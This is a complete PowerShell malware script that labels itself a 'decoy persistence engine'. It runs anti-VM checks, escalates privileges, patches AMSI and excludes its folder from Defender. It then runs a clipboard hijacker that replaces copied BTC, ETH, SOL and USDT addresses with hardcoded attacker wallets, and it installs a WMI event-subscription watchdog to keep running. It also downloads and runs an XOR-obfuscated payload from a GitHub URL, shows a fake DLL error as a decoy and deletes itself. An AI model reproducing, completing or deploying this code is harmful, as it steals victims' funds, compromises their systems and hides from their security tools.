# --- [MEV-PRIME v87.5: DECVOY PERSISTENCE ENGINE] ---
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. ANTI-VM & PRIVILEGE ESCALATION
if ($((Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum).Sum / 1GB) -lt 4) { exit } 
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList "-NoP -EP Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# 2. AMSI MEMORY PATCH
try {
    [Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
} catch { }

# 3. THE CLIPPER LOGIC (Verified Addresses)
$ClipperScript = {
    $w = @{
        'btc'  = '12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA';
        'eth'  = '0x6c9ba9a6522b10135bb836fc9340477ba15f3392';
        'sol'  = 'BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR';
        'usdt' = 'TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp'
    }
    Add-Type -As System.Windows.Forms
    while($true) {
        try {
            if([Windows.Forms.Clipboard]::ContainsText()){
                $v = [Windows.Forms.Clipboard]::GetText().Trim()
                if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ 
                    if($v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) }
                }
                elseif($v -match "^0x[a-fA-F0-9]{40}$"){ 
                    if($v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) }
                }
                elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ 
                    if($v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) }
                }
                elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ 
                    if($v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) }
                }
            }
        } catch{}
        Start-Sleep -m 500
    }
}

# 4. WMI WATCHDOG INSTALLATION
function Set-PermanentWatchdog {
    $B64 = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($using:ClipperScript))
    $Query = "SELECT * FROM __InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'powershell.exe'"
    $Command = "powershell.exe -NoP -W Hidden -EP Bypass -Enc $B64"
    $NS = "root\subscription"; $FilterName = "MevSyncFilter"; $ConsumerName = "MevSyncConsumer"
    Get-WmiObject -Namespace $NS -Class __EventFilter -Filter "Name='$FilterName'" | Remove-WmiObject -ErrorAction SilentlyContinue
    Get-WmiObject -Namespace $NS -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'" | Remove-WmiObject -ErrorAction SilentlyContinue
    $Filter = Set-WmiInstance -Namespace $NS -Class __EventFilter -Arguments @{Name=$FilterName; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query=$Query}
    $Consumer = Set-WmiInstance -Namespace $NS -Class CommandLineEventConsumer -Arguments @{Name=$ConsumerName; CommandLineTemplate=$Command}
    Set-WmiInstance -Namespace $NS -Class __FilterToConsumerBinding -Arguments @{Filter=$Filter; Consumer=$Consumer} | Out-Null
}

# 5. EXECUTION & DEPLOYMENT
try {
    # Initialize background work
    Start-Job -ScriptBlock $ClipperScript -Name "MevActive" | Out-Null
    Set-PermanentWatchdog
    
    # XOR Downloader Logic
    $dir = "$env:PROGRAMDATA\Microsoft\Windows\Sync"
    if (!(Test-Path $dir)) { New-Item $dir -ItemType Directory -Force }
    Add-MpPreference -ExclusionPath $dir -ErrorAction SilentlyContinue
    
    $path = Join-Path $dir "WinSvcHost.exe"
    $wc = New-Object Net.WebClient; $wc.Headers.Add("User-Agent", "Mozilla/5.0")
    $raw = $wc.DownloadString("https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt")
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++) { $data[$i] = $data[$i] -bxor 0xAB }
    [IO.File]::WriteAllBytes($path, $data)
    Start-Process $path -WindowStyle Hidden

    # 6. FAKE DLL ERROR (The Decoy)
    $msg = "The program can't start because msvcr120_clr0400.dll is missing from your computer. Try reinstalling the program to fix this problem."
    $title = "System Error"
    [Windows.Forms.MessageBox]::Show($msg, $title, 0, 16) | Out-Null

    # Cleanup
    Remove-Item $PSCommandPath -Force -ErrorAction SilentlyContinue
} catch { }
